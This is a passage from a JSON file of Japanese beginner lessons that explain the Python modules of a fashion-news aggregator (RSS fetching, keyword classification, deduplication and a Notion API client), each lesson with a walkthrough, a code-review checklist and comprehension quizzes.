**logging**：プログラムの動きを記録する標準ライブラリ\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ タイムアウト、ステータスのチェック、User-Agent の明示と、通信まわりが丁寧\n- ✅ 1 サイトの失敗で全体が止まらない\n- ✅ タイトルやリンクが無い壊れた記事を飛ばしている\n- ⚠️ サイトを 1 つずつ順番に取りに行くので、遅いサイトがあると全体も遅くなる（最大 20 秒 × 8 サイト）。今の規模なら問題なし\n- ⚠️ 全サイトの取得に失敗したときは、`main.py` 側でエラー終了するようになっている（このファイル単体では空のリストを返すだけ）\n\n## 🗣️ 30 秒で人に説明するなら\n\n「fetch.py はニュースの仕入れ担当です。設定ファイルにある 8 つのサイトの RSS を requests で順番にダウンロードして、feedparser で読み解き、タイトル・URL・公開日時を Article にして返します。\nタイムアウトや User-Agent も付けていて、どこか 1 サイトが失敗しても警告をログに出して他のサイトは続けます。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "3 つ目のサイトの取得でエラーが起きた。4 つ目以降はどうなる？",
      "choices": [
       "プログラム全体が止まる",
       "警告をログに出して、4 つ目以降も取りに行く",
       "1 つ目からやり直す"
      ],
      "answer": 1,
      "explain": "try / except がループの中にあるので、失敗はそのサイトだけで済みます。"
     },
     {
      "question": "`e.get(\"published_parsed\") or e.get(\"updated_parsed\")` の意味は？",
      "choices": [
       "公開日時があればそれを、無ければ更新日時を使う",
       "両方の日時を足す",
       "両方そろっていないとエラー"
      ],
      "answer": 0,
      "explain": "or は「左が無い（None など）なら右」という意味で使われています。"
     },
     {
      "question": "`timeout=20` を付けない場合に起こりうる問題は？",
      "choices": [
       "記事が 20 件に制限される",
       "応答しないサイトがあると、いつまでも待ち続ける",
       "RSS が読めなくなる"
      ],
      "answer": 1,
      "explain": "requests は既定ではタイムアウトしないので、明示するのが定番です。"
     }
    ]
   ],
   "id": "2026-11-16-fashion-news-04-fetch"
  },
  {
   "title": "classify.py ― タイトルのキーワードでジャンルに分ける「仕分け担当」",
   "language": "Python",
   "date": "2026-11-16",
   "level": 2,
   "series": "fashion_news",
   "part": 5,
   "concepts": [
    "conditionals",
    "loops",
    "collections",
    "strings",
    "functions"
   ],
   "lessons": [
    "10-python/02-conditionals",
    "10-python/03-loops",
    "10-python/09-comprehensions-lambda",
    "10-python/06-strings"
   ],
   "summary": "記事のタイトルに含まれるキーワードでジャンルを決め、ファッションと関係ない記事を取り除く。",
   "body": "## 📄 解説するコード\n\n`src/fashion_news/classify.py`\n\n```python\nfrom __future__ import annotations\n\nfrom .models import Article\n\n\ndef classify(article: Article, config: dict) -> str:\n    if article.kind in config.get(\"niche_kinds\", []):\n        return config[\"niche_category\"]\n    text = article.title.lower()\n    for cat in config[\"categories\"]:\n        if any(k.lower() in text for k in cat[\"keywords\"]):\n            return cat[\"name\"]\n    return config[\"fallback_category\"]\n\n\ndef category_order(config: dict) -> list[str]:\n    return (\n        [c[\"name\"] for c in config[\"categories\"]]\n        + [config[\"niche_category\"], config[\"fallback_category\"]]\n    )\n\n\ndef is_fashion(article: Article, config: dict) -> bool:\n    text = article.title.lower()\n    return any(k.lower() in text for k in config.get(\"fashion_keywords\", []))\n\n\ndef apply_source_filters(articles: list[Article], sources: list[dict], config: dict) -> list[Article]:\n    strict = {s[\"name\"] for s in sources if s.get(\"require_fashion\")}\n    return [a for a in articles if a.source not in strict or is_fashion(a, config)]\n```\n\n## 🧭 ひとことで言うと\n\n**Python** で書かれた、**記事のタイトルに含まれるキーワードを見て、ジャンル（ハイブランド・スニーカーなど）を決める** ファイルです。AI は使わず、`categories.yaml` の辞書との単純な照らし合わせ（ルールベース）で分けています。\n\n## 🗺️ 全体の流れ\n\n1. `apply_source_filters`：`require_fashion` の情報源から来た記事のうち、ファッションと関係ないものを取り除く\n2. `classify`：1 記事ごとにジャンル名を決める\n3. `category_order`：Notion に並べるジャンルの順番を作る\n\n## 🔍 ブロックごとの解説\n\n### classify：ジャンルを 1 つ決める\n\n```python\nif article.kind in config.get(\"niche_kinds\", []):\n    return config[\"niche_category\"]\n```\n\nまず情報源の種類を見ます。`sns` か `official` なら、キーワードに関係なく **「公式発表・ニッチ」で即決** です。`return` した時点で関数は終わります。\n\n```python\ntext = article.title.lower()\nfor cat in config[\"categories\"]:\n    if any(k.lower() in text for k in cat[\"keywords\"]):\n        return cat[\"name\"]\nreturn config[\"fallback_category\"]\n```\n\n- `.lower()`：英字を小文字にそろえる。「Nike」も「NIKE」も「nike」として比べられる\n- `for cat in ...`：ジャンルを **上から順に** 調べる\n- `any(k.lower() in text for k in cat[\"keywords\"])`：「キーワードのうち **どれか 1 つでも** タイトルに含まれていれば True」\n- 当たった時点で `return` するので、**最初に当たったジャンル 1 つ** に決まる\n- 最後まで当たらなければ「その他」\n\n### any(...) の読み方\n\n```python\nany(k.lower() in text for k in cat[\"keywords\"])\n```\n\nこれは次の for 文と同じ意味です。\n\n```python\nfound = False\nfor k in cat[\"keywords\"]:\n    if k.lower() in text:\n        found = True\n        break\n```\n\n`any` は「1 つでも True があれば True」、`all` は「全部 True なら True」。AI のコードで頻出の短い書き方です。\n\n### category_order：並べる順番\n\n```python\n[c[\"name\"] for c in config[\"categories\"]] + [config[\"niche_category\"], config[\"fallback_category\"]]\n```\n\nリスト内包表記で 4 つのジャンル名を取り出し、最後に「公式発表・ニッチ」「その他」を足しています。Notion のページはこの順に見出しが並びます。\n\n### apply_source_filters：ファッションと関係ない記事を除く\n\n```python\nstrict = {s[\"name\"] for s in sources if s.get(\"require_fashion\")}\nreturn [a for a in articles if a.source not in strict or is_fashion(a, config)]\n```\n\n- `strict`：`require_fashion: true` が付いた情報源の名前の **セット**（`{ }` の内包表記はセットになる）\n- 残す条件：「厳しくしない情報源から来た記事」**または**「ファッション系のキーワードを含む記事」\n- はてなブックマークのように話題が幅広い情報源だけ、ファッション記事に絞り込むしくみ\n\n## 🐍 Python の書き方で見落としやすい点\n\n| 書き方 | ポイント |\n|---|---|\n| `\"コレクション\" in text` | 文字列の中に含まれるか（部分一致）。「コレクションズ」でも当たる |\n| `config.get(\"niche_kinds\", [])` | キーが無ければ空のリスト。設定の書き忘れでも止まらない |\n| `{... for s in sources}` | `[ ]` ならリスト、`{ }` ならセット（重複なし・`in` の判定が速い） |\n| `return` を途中に書く | 当たった時点で即終了。「早期リターン」と呼ばれる読みやすい書き方 |\n\n## 🔑 キーワード\n\n- **ルールベース**：決めたルール（キーワード辞書）で判断する方式。AI を使う方式との対比\n- **any / all**：「どれか 1 つ」「全部」を判定する組み込み関数\n- **部分一致**：文字列の一部に含まれているかで判定すること\n- **セット（set）**：重複を持たない入れ物。`in` の判定が速い\n- **早期リターン**：条件が決まった時点で関数を抜ける書き方\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ 関数が小さく、それぞれテストされている（10 ページ目）\n- ✅ 大文字・小文字の違いを吸収している\n- ⚠️ 部分一致なので、意図しない記事にも当たる。例：キーワード「パリ」は「パリッと焼けたパン」にも当たる\n- ⚠️ 1 記事 1 ジャンルなので、要件定義書の「複数ジャンルを付けてよい」とは違う\n- ⚠️ 全角・半角（「ＮＩＫＥ」と「NIKE」）は同じ扱いにならない。`dedupe.py` で使っている `unicodedata.normalize(\"NFKC\", ...)` を使えばそろえられる\n\n## 🗣️ 30 秒で人に説明するなら\n\n「classify.py は記事の仕分け担当です。SNS や公式発表から来た記事はまず『公式発表・ニッチ』に入れて、それ以外はタイトルにキーワード辞書の言葉が含まれるかを上から順に調べ、最初に当たったジャンルに入れます。\nどれにも当たらなければ『その他』です。はてブのような幅広い情報源は、ファッション系の言葉を含む記事だけ残すフィルターもかけています。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "`any(k in \"nikeの新作\" for k in [\"adidas\", \"nike\"])` の結果は？",
      "choices": [
       "True",
       "False",
       "\"nike\""
      ],
      "answer": 0,
      "explain": "\"nike\" が含まれているので、1 つでも当たれば True です。"
     },
     {
      "question": "kind が sns の記事「ナイキの新作スニーカー」のジャンルは？",
      "choices": [
       "ストリート/スニーカー",
       "公式発表・ニッチ",
       "その他"
      ],
      "answer": 1,
      "explain": "種類（kind）の判定がキーワードより先に行われます。"
     },
     {
      "question": "`{s[\"name\"] for s in sources}` が作るのは？",
      "choices": [
       "リスト",
       "辞書",
       "セット"
      ],
      "answer": 2,
      "explain": "{ } の内包表記で「キー: 値」の形でなければセットになります。"
     }
    ]
   ],
   "id": "2026-11-16-fashion-news-05-classify"
  },
  {
   "title": "dedupe.py ― 古い記事・同じ記事を取り除く「検品担当」",
   "language": "Python",
   "date": "2026-11-16",
   "level": 3,
   "series": "fashion_news",
   "part": 6,
   "concepts": [
    "strings",
    "collections",
    "loops",
    "functions"
   ],
   "lessons": [
    "10-python/06-strings",
    "10-python/04-lists-and-dicts",
    "10-python/09-comprehensions-lambda",
    "10-python/05-functions"
   ],
   "summary": "URL とタイトルを「比べやすい形」に整えてから、古い記事・掲載済みの記事・ほぼ同じ記事を除く。",
   "body": "## 📄 解説するコード\n\n`src/fashion_news/dedupe.py`\n\n```python\nfrom __future__ import annotations\n\nimport re\nimport unicodedata\nfrom datetime import datetime, timedelta\nfrom difflib import SequenceMatcher\nfrom urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit\n\nfrom .models import Article\n\n_TRACKING = re.compile(r\"^(utm_|fbclid|gclid|ref$|ref_)\")\n\n\ndef normalize_url(url: str) -> str:\n    p = urlsplit(url.strip())\n    query = [(k, v) for k, v in parse_qsl(p.query) if not _TRACKING.match(k)]\n    path = p.path.rstrip(\"/\") or \"/\"\n    return urlunsplit((p.scheme.lower(), p.netloc.lower(), path, urlencode(query), \"\"))\n\n\ndef normalize_title(title: str) -> str:\n    t = unicodedata.normalize(\"NFKC\", title).lower()\n    t = re.sub(r\"\\s+[-–|｜]\\s+[^-–|｜]+$\", \"\", t)  # 末尾の「 - 媒体名」を除く\n    return re.sub(r\"[\\W_]+\", \"\", t)\n\n\ndef filter_recent(articles: list[Article], now: datetime, hours: int = 36) -> list[Article]:\n    \"\"\"日付のない記事は残す（重複除去に任せる）。\"\"\"\n    cutoff = now - timedelta(hours=hours)\n    return [a for a in articles if a.published is None or a.published >= cutoff]\n\n\ndef dedupe(\n    articles: list[Article], seen_urls: set[str], similarity: float = 0.9\n) -> list[Article]:\n    kept: list[Article] = []\n    kept_titles: list[str] = []\n    for a in articles:\n        url = normalize_url(a.url)\n        if url in seen_urls:\n            continue\n        nt = normalize_title(a.title)\n        if not nt:\n            continue\n        if any(nt == t or SequenceMatcher(None, nt, t).ratio() >= similarity for t in kept_titles):\n            continue\n        kept.append(a)\n        kept_titles.append(nt)\n        seen_urls = seen_urls | {url}\n    return kept\n```\n\n## 🧭 ひとことで言うと\n\n**Python** で書かれた、**同じニュースが何度も載らないようにする** ファイルです。URL とタイトルを「比べやすい形」に整えてから、古い記事・掲載済みの記事・タイトルがほぼ同じ記事を取り除きます。このシリーズで一番むずかしいファイルなので、ゆっくり読みましょう。\n\n## 🗺️ 全体の流れ\n\n1. `filter_recent`：36 時間より前の記事を取り除く\n2. `dedupe`：1 記事ずつ見て、次のどれかに当たれば捨てる\n   - URL が過去に載せたもの（`seen_urls`）に入っている\n   - タイトルが空\n   - すでに残した記事とタイトルが 90% 以上似ている\n3. 比べる前に、`normalize_url` と `normalize_title` で「表記ゆれ」をそろえる\n\n## 🔍 ブロックごとの解説\n\n### なぜ「そろえる（正規化）」が必要？\n\n同じ記事でも、URL やタイトルの書き方が少し違うことがよくあります。\n\n| 同じ記事なのに… | 例 |\n|---|---|\n| URL に追跡用の文字がついている | `https://ex.com/a?utm_source=x` と `https://ex.com/a` |\n| 最後の `/` の有無 | `https://ex.com/a/` と `https://ex.com/a` |\n| タイトルの後ろに媒体名 | `新作スニーカー発売 - 某メディア` と `新作スニーカー発売` |\n| 全角・半角、大文字・小文字 | `ＮＩＫＥ` と `nike` |\n\nそのまま比べると「別の記事」と判定されてしまうので、**比べる前に同じ形に整える** のが正規化です。\n\n### normalize_url：URL を整える\n\n```python\np = urlsplit(url.strip())\nquery = [(k, v) for k, v in parse_qsl(p.query) if not _TRACKING.match(k)]\npath = p.path.rstrip(\"/\") or \"/\"\nreturn urlunsplit((p.scheme.lower(), p.netloc.lower(), path, urlencode(query), \"\"))\n```\n\n1. `urlsplit`：URL を「https」「ex.com」「/a/」「utm_source=x&id=1」などの部品に分ける\n2. `?` 以降の項目（クエリ）から、`utm_`・`fbclid` など **広告の追跡用の項目だけ** 取り除く\n3. 最後の `/` を取る（全部取れて空になったら `/` にする）\n4. 小文字にそろえて組み立て直す。最後の `\"\"` は `#top` のような **ページ内の位置（フラグメント）を捨てる** という意味\n\n例：`https://EX.com/a/?utm_source=x&id=1#top` → `https://ex.com/a?id=1`\n\n### 正規表現（re）の読み方\n\n```python\n_TRACKING = re.compile(r\"^(utm_|fbclid|gclid|ref$|ref_)\")\n```\n\n正規表現は「文字のパターン」を書くための小さな言語です。\n\n| 記号 | 意味 |\n|---|---|\n| `^` | 先頭から |\n| `( A \\| B )` | A または B |\n| `$` | そこで終わり |\n\nなので「`utm_` で始まる」「`fbclid` で始まる」「ちょうど `ref`」「`ref_` で始まる」のどれかに一致します。\n\n### normalize_title：タイトルを整える\n\n```python\nt = unicodedata.normalize(\"NFKC\", title).lower()\nt = re.sub(r\"\\s+[-–|｜]\\s+[^-–|｜]+$\", \"\", t)\nreturn re.sub(r\"[\\W_]+\", \"\", t)\n```\n\n1. `NFKC`：全角英数字を半角に、半角カナを全角に…と **文字の種類をそろえる**。そのあと小文字に\n2. 1 つ目の `re.sub`：末尾の「` - 媒体名`」を消す。`\\s+` は空白、`[-–|｜]` は区切り記号のどれか、`[^-–|｜]+$` は「区切り記号以外の文字が最後まで続く」\n3. 2 つ目の `re.sub`：記号・空白（`\\W` は「文字でも数字でもないもの」）を全部消す\n\n例：`新作スニーカー発売！ - 某メディア` → `新作スニーカー発売`\n\n### filter_recent：新しい記事だけ残す\n\n```python\ncutoff = now - timedelta(hours=hours)\nreturn [a for a in articles if a.published is None or a.published >= cutoff]\n```\n\n「今から 36 時間前」を境目にして、それより新しい記事を残します。**日付が無い記事は残す**（あとの重複チェックや掲載済みチェックに任せる）という判断です。\n要件では「直近 24 時間」ですが、少し余裕を持って 36 時間にしているようです（掲載済みチェックがあるので、重なっても二重には載りません）。\n\n### dedupe：重複を取り除く本体\n\n```python\nif any(nt == t or SequenceMatcher(None, nt, t).ratio() >= similarity for t in kept_titles):\n    continue\n```\n\n`SequenceMatcher(...).ratio()` は、2 つの文字列が **どれくらい似ているかを 0〜1 で返す** 標準ライブラリの機能です。0.9 以上なら「ほぼ同じ記事」として捨てます。\n別のサイトが同じニュースを少し違うタイトルで出していても、まとめられます。\n\n```python\nseen_urls = seen_urls | {url}\n```\n\n残した記事の URL も「見たもの」に足して、同じ実行の中で同じ URL が 2 回出ても捨てられるようにしています。`|` はセットの合体です。\n\n## 🐍 Python の書き方で見落としやすい点\n\n| 書き方 | ポイント |\n|---|---|\n| `r\"...\"` | raw 文字列。`\\s` などの `\\` をそのまま正規表現に渡すため |\n| `re.compile(...)` | 正規表現を前もって準備しておく。何度も使うときに速い |\n| `p.path.rstrip(\"/\") or \"/\"` | 空文字になったら `/` を使う、という `or` の定番の使い方 |\n| `seen_urls = seen_urls \\| {url}` | 元のセットを変えずに **新しいセットを作る**。呼び出し元の `seen` を書き換えないための書き方 |\n| `_TRACKING` の先頭の `_` | 「このファイルの中だけで使う」という慣習 |\n\n## 🔑 キーワード\n\n- **正規化**：比べやすいように表記ゆれをそろえること\n- **正規表現**：文字のパターンを表す書き方（`re` モジュール）\n- **クエリ**：URL の `?` 以降の部分。`key=value` が `&` でつながる\n- **トラッキングパラメータ**：`utm_source` など、どこから来たかを計測するための追跡用の項目\n- **NFKC**：全角・半角などの文字の種類をそろえる Unicode の正規化方式\n- **類似度（ratio）**：2 つの文字列がどれだけ似ているかを 0〜1 で表した値\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ 表記ゆれに丁寧に対処していて、テストもある（10 ページ目）\n- ✅ 呼び出し元のデータを書き換えないように作られている\n- ⚠️ 記事が増えると遅くなる：残した記事全部とタイトルを比べるので、記事数の 2 乗に比例して時間がかかる。今の規模（数百件）なら問題なし\n- ⚠️ 似ているけれど別のニュース（例：「〇〇 春夏コレクション発表」と「〇〇 秋冬コレクション発表」）が 90% 以上似ていると、片方が消える可能性がある\n- ⚠️ `seen_urls | {url}` は毎回セットをまるごと作り直すので少し無駄がある（`set.add` を使えば速いが、元のデータを守るために最初に一度コピーする必要がある）\n\n## 🗣️ 30 秒で人に説明するなら\n\n「dedupe.py は同じニュースを二重に載せないための検品担当です。まず 36 時間より古い記事を落とし、URL は追跡用のパラメータや末尾のスラッシュを取って、タイトルは全角半角や記号、末尾の媒体名を取ってそろえます。\nそのうえで、過去に載せた URL や、すでに残したタイトルと 90% 以上似ている記事を捨てています。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "`normalize_url(\"https://Ex.com/news/?utm_source=x\")` の結果は？",
      "choices": [
       "https://Ex.com/news/?utm_source=x",
       "https://ex.com/news",
       "https://ex.com/news/"
      ],
      "answer": 1,
      "explain": "ドメインを小文字にし、utm_ の項目と末尾の / を取り除きます。"
     },
     {
      "question": "公開日時が分からない（None の）記事は filter_recent でどうなる？",
      "choices": [
       "残される",
       "捨てられる",
       "エラーになる"
      ],
      "answer": 0,
      "explain": "「日付のない記事は残す（重複除去に任せる）」と書かれています。"
     },
     {
      "question": "`SequenceMatcher(None, a, b).ratio()` が返すのは？",
      "choices": [
       "a と b の文字数の差",
       "a と b の似ている度合い（0〜1）",
       "a が b に含まれるかどうか"
      ],
      "answer": 1,
      "explain": "1 に近いほど似ています。このコードでは 0.9 以上を同じ記事とみなします。"
     }
    ]
   ],
   "id": "2026-11-16-fashion-news-06-dedupe"
  },
  {
   "title": "notion.py ― Notion にページを作る「配送担当」",
   "language": "Python",
   "date": "2026-11-16",
   "level": 3,
   "series": "fashion_news",
   "part": 7,
   "concepts": [
    "http_api",
    "classes",
    "data_formats",
    "errors",
    "security"
   ],
   "lessons": [
    "10-python/10-classes",
    "10-python/04-lists-and-dicts",
    "10-python/07-exceptions",
    "100-ai-dev/06-secrets-env"
   ],
   "summary": "Notion API を使って、ジャンル見出しと記事リンクの箇条書きでページを作る。失敗時のリトライ付き。",
   "body": "## 📄 解説するコード\n\n`src/fashion_news/notion.py`\n\n```python\nfrom __future__ import annotations\n\nimport logging\nimport time\n\nimport requests\n\nfrom .models import Article\n\nlog = logging.getLogger(__name__)\nAPI = \"https://api.notion.com/v1\"\nVERSION = \"2022-06-28\"\nMAX_CHILDREN = 100  # 1回のリクエストで送れるブロック数の上限\n\n\ndef build_blocks(grouped: dict[str, list[Article]]) -> list[dict]:\n    blocks: list[dict] = []\n    for category, items in grouped.items():\n        if not items:\n            continue\n        blocks.append(\n            {\n                \"type\": \"heading_2\",\n                \"heading_2\": {\"rich_text\": [{\"type\": \"text\", \"text\": {\"content\": category}}]},\n            }\n        )\n        for a in items:\n            blocks.append(\n                {\n                    \"type\": \"bulleted_list_item\",\n                    \"bulleted_list_item\": {\n                        \"rich_text\": [\n                            {\n                                \"type\": \"text\",\n                                \"text\": {\"content\": a.title[:1900], \"link\": {\"url\": a.url}},\n                            },\n                            {\"type\": \"text\", \"text\": {\"content\": f\" — {a.source}\"}},\n                        ]\n                    },\n                }\n            )\n    return blocks\n\n\nclass NotionClient:\n    def __init__(self, token: str):\n        self.s = requests.Session()\n        self.s.headers.update(\n            {\n                \"Authorization\": f\"Bearer {token}\",\n                \"Notion-Version\": VERSION,\n                \"Content-Type\": \"application/json\",\n            }\n        )\n\n    def _request(self, method: str, path: str, **kw) -> dict:\n        for attempt in range(4):\n            r = self.s.request(method, f\"{API}{path}\", timeout=30, **kw)\n            if r.status_code == 429 or r.status_code >= 500:\n                time.sleep(float(r.headers.get(\"Retry-After\", 2 ** attempt)))\n                continue\n            if not r.ok:\n                raise RuntimeError(f\"Notion API {r.status_code}: {r.text[:300]}\")\n            return r.json()\n        raise RuntimeError(f\"Notion API が繰り返し失敗: {method} {path}\")\n\n    def find_child_page(self, parent_id: str, title: str) -> str | None:\n        cursor = None\n        while True:\n            params = {\"page_size\": 100, **({\"start_cursor\": cursor} if cursor else {})}\n            data = self._request(\"GET\", f\"/blocks/{parent_id}/children\", params=params)\n            for b in data[\"results\"]:\n                if b[\"type\"] == \"child_page\" and b[\"child_page\"][\"title\"] == title:\n                    return b[\"id\"]\n            if not data.get(\"has_more\"):\n                return None\n            cursor = data[\"next_cursor\"]\n\n    def create_daily_page(self, parent_id: str, title: str, blocks: list[dict]) -> str:\n        page = self._request(\n            \"POST\",\n            \"/pages\",\n            json={\n                \"parent\": {\"page_id\": parent_id},\n                \"properties\": {\"title\": {\"title\": [{\"text\": {\"content\": title}}]}},\n                \"children\": blocks[:MAX_CHILDREN],\n            },\n        )\n        for i in range(MAX_CHILDREN, len(blocks), MAX_CHILDREN):\n            self._request(\n                \"PATCH\",\n                f\"/blocks/{page['id']}/children\",\n                json={\"children\": blocks[i : i + MAX_CHILDREN]},\n            )\n        return page[\"url\"]\n```\n\n## 🧭 ひとことで言うと\n\n**Python** で書かれた、**Notion API（プログラムから Notion を操作する窓口）を使って、ニュースのページを作る** ファイルです。ページの中身を Notion の形式に組み立てる関数と、Notion とやりとりするクラスの 2 つでできています。\n\n## 🗺️ 全体の流れ\n\n1. `build_blocks`：ジャンル別の記事を、Notion の「ブロック」（見出し・箇条書きなどの部品）のリストに変換する\n2. `NotionClient(token)`：トークン（合言葉）を持った通信係を作る\n3. `find_child_page`：同じタイトルのページ（例：「2026-11-16 朝刊」）がもう無いか調べる\n4. `create_daily_page`：ページを作り、ブロックを 100 個ずつ送り込む\n5. 通信が混雑・失敗したら、少し待ってやり直す（`_request`）\n\n## 🔍 ブロックごとの解説\n\n### Notion の「ブロック」は辞書の入れ子\n\nNotion のページは「ブロック」という部品の積み重ねです。API には、それを **辞書（JSON）** で送ります。\n\n```python\n{\"type\": \"heading_2\", \"heading_2\": {\"rich_text\": [{\"type\": \"text\", \"text\": {\"content\": \"ストリート/スニーカー\"}}]}}\n```\n\n入れ子が深くて読みにくいですが、外側から読むと「種類は見出し 2（`##`）で、文字は『ストリート/スニーカー』」というだけです。\n記事は箇条書き（`bulleted_list_item`）で、タイトルにリンクを付け、後ろに「 — 出典名」を付けています。\n`a.title[:1900]` は、Notion の 1 つの文字ブロックの上限（2000 文字）を超えないように、念のため切っています。\n\n### NotionClient：通信係のクラス\n\n```python\nself.s = requests.Session()\nself.s.headers.update({\"Authorization\": f\"Bearer {token}\", ...})\n```\n\n- `requests.Session()`：同じ相手と何度もやりとりするための「通信の窓口」。ヘッダーを一度設定すれば毎回付けてくれる\n- `Authorization: Bearer トークン`：「この合言葉を持っている者です」と名乗る。**トークンはコードに書かず、`main.py` が環境変数から受け取って渡している**\n- `Notion-Version`：どの版の API の仕様で話すかを指定\n\n### _request：混雑していたら待ってやり直す\n\n```python\nfor attempt in range(4):\n    r = self.s.request(method, f\"{API}{path}\", timeout=30, **kw)\n    if r.status_code == 429 or r.status_code >= 500:\n        time.sleep(float(r.headers.get(\"Retry-After\", 2 ** attempt)))\n        continue\n```\n\n- `429`：「アクセスが多すぎます」、`500` 番台：「サーバー側の不調」。どちらも **時間をおけば成功するかもしれない** エラー\n- `Retry-After`（何秒待てばいいか）が返ってくればその秒数、無ければ 1, 2, 4, 8 秒…と **だんだん長く待つ**（指数バックオフ）\n- 最大 4 回試してダメならエラーにする\n- 400 番台（リクエストの間違い・権限なし）は待っても直らないので、すぐにエラーにする\n- 名前の先頭の `_` は「クラスの中だけで使う」という慣習\n- `**kw` は「受け取ったキーワード引数を、そのまま次に渡す」（`params=` や `json=` を中継している）\n\n### find_child_page：ページの一覧を少しずつ読む\n\n```python\nwhile True:\n    data = self._request(\"GET\", f\"/blocks/{parent_id}/children\", params=params)\n    ...\n    if not data.get(\"has_more\"):\n        return None\n    cursor = data[\"next_cursor\"]\n```\n\nNotion は一度に 100 件までしか返さないので、「続きがある（`has_more`）なら、続きの目印（`cursor`）を付けてもう一度聞く」を繰り返します。これを **ページネーション** と呼び、多くの Web API で見る形です。\n\n### create_daily_page：100 個ずつ送る\n\n最初の 100 ブロックはページ作成と同時に送り、残りは `PATCH`（追加）で 100 個ずつ送ります。\n`range(100, len(blocks), 100)` は 100, 200, 300… と 100 刻みの数を作り、`blocks[i : i + 100]` でそこから 100 個を切り出します。\n\n## 🐍 Python の書き方で見落としやすい点\n\n| 書き方 | ポイント |\n|---|---|\n| `**({\"start_cursor\": cursor} if cursor else {})` | cursor があるときだけ辞書に項目を足す。`**` は辞書を展開して合体させる |\n| `**kw` | 受け取ったキーワード引数をまとめて受け取り、そのまま渡す |\n| `2 ** attempt` | 2 の attempt 乗（1, 2, 4, 8） |\n| `blocks[i : i + 100]` | スライス。範囲外でもエラーにならず、ある分だけ返る |\n| `raise RuntimeError(...)` | 自分でエラーを起こす。`main.py` まで伝わってプログラムが失敗として終わる |\n\n## 🔑 キーワード\n\n- **Notion API**：プログラムから Notion を操作する窓口\n- **ブロック**：Notion のページを作る部品（見出し・段落・箇条書きなど）\n- **トークン（Bearer）**：API を使う権利を示す合言葉。秘密情報\n- **セッション**：同じ相手とのやりとりをまとめて管理する仕組み\n- **リトライ・指数バックオフ**：失敗したら待ち時間を倍々に増やしてやり直すこと\n- **ページネーション**：データを何回かに分けて受け取る仕組み\n- **ステータスコード**：200（成功）、429（多すぎ）、500（サーバーの不調）など、結果を表す番号\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ トークンをコードに書かず、外から受け取っている\n- ✅ 混雑時は待ってやり直し、直らないエラーはすぐ止める、という使い分けができている\n- ✅ ブロック数や文字数の上限を考慮している\n- ⚠️ ページを作ったあと、残りのブロックの追加に失敗すると、**途中までのページが Notion に残る**。次の回は「作成済み」と判定されて作り直されない（`--force` で作り直せる）\n- ⚠️ `Notion-Version: 2022-06-28` は固定。Notion 側で古い版が使えなくなったら更新が必要になる\n\n## 🗣️ 30 秒で人に説明するなら\n\n「notion.py は Notion への配送担当です。ジャンルごとの記事を、Notion の見出しブロックとリンク付きの箇条書きブロックに組み立てて、Notion API でページを作ります。\nトークンはヘッダーに付けて送り、混雑やサーバーエラーのときは待ち時間を増やしながら最大 4 回やり直します。\n同じタイトルのページが既にあるかを調べる機能もあって、二重に作らないようにしています。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "Notion API が 429 を返したとき、このコードはどうする？",
      "choices": [
       "すぐにエラーで終了する",
       "少し待ってからやり直す",
       "別の API に切り替える"
      ],
      "answer": 1,
      "explain": "429 は「多すぎる」の意味なので、待てば成功する可能性があります。"
     },
     {
      "question": "Notion API が 401（認証エラー）を返したときは？",
      "choices": [
       "やり直さずにすぐエラーにする",
       "4 回までやり直す",
       "無視して次に進む"
      ],
      "answer": 0,
      "explain": "400 番台は待っても直らないので、`raise RuntimeError` ですぐ止めます。"
     },
     {
      "question": "ブロックが 250 個あるとき、create_daily_page は API を何回呼ぶ？",
      "choices": [
       "1 回",
       "2 回",
       "3 回"
      ],
      "answer": 2,
      "explain": "ページ作成で 100 個、そのあと PATCH で 100 個と 50 個を送ります。"
     }
    ]
   ],
   "id": "2026-11-16-fashion-news-07-notion"
  },
  {
   "title": "main.py ― すべての部品を順番に動かす「工場長」",
   "language": "Python",
   "date": "2026-11-16",
   "level": 3,
   "series": "fashion_news",
   "part": 8,
   "concepts": [
    "functions",
    "io",
    "data_formats",
    "errors",
    "collections",
    "security"
   ],
   "lessons": [
    "10-python/05-functions",
    "10-python/08-modules",
    "10-python/11-files-and-json",
    "100-ai-dev/06-secrets-env"
   ],
   "summary": "設定と履歴を読み込み、集める → ふるう → 仕分ける → Notion に作る → 履歴を保存する、を順に指示する司令塔。",
   "body": "## 📄 解説するコード\n\n`src/fashion_news/main.py`\n\n```python\nfrom __future__ import annotations\n\nimport argparse\nimport json\nimport logging\nimport os\nfrom datetime import datetime, timedelta, timezone\nfrom pathlib import Path\n\nimport yaml\n\nfrom .classify import apply_source_filters, category_order, classify\nfrom .dedupe import dedupe, filter_recent, normalize_url\nfrom .fetch import fetch_all\nfrom .models import Article\nfrom .notion import NotionClient, build_blocks\n\nlog = logging.getLogger(\"fashion_news\")\nJST = timezone(timedelta(hours=9))\nROOT = Path(__file__).resolve().parents[2]\nSEEN_KEEP_DAYS = 30\n\n\ndef load_seen(path: Path) -> dict[str, str]:\n    if not path.exists():\n        return {}\n    return json.loads(path.read_text(encoding=\"utf-8\") or \"{}\")\n\n\ndef prune_seen(seen: dict[str, str], today: str) -> dict[str, str]:\n    limit = (datetime.fromisoformat(today) - timedelta(days=SEEN_KEEP_DAYS)).date().isoformat()\n    return {u: d for u, d in seen.items() if d >= limit}\n\n\ndef group_articles(articles: list[Article], config: dict) -> dict[str, list[Article]]:\n    grouped = {name: [] for name in category_order(config)}\n    for a in articles:\n        a.category = classify(a, config)\n        grouped[a.category].append(a)\n    limit = config.get(\"max_per_category\")\n    oldest = datetime.min.replace(tzinfo=timezone.utc)\n    for name, items in grouped.items():\n        items.sort(key=lambda a: a.published or oldest, reverse=True)  # 新しい順\n        if limit:\n            grouped[name] = items[:limit]\n    return grouped\n\n\ndef render_text(title: str, grouped: dict[str, list[Article]]) -> str:\n    lines = 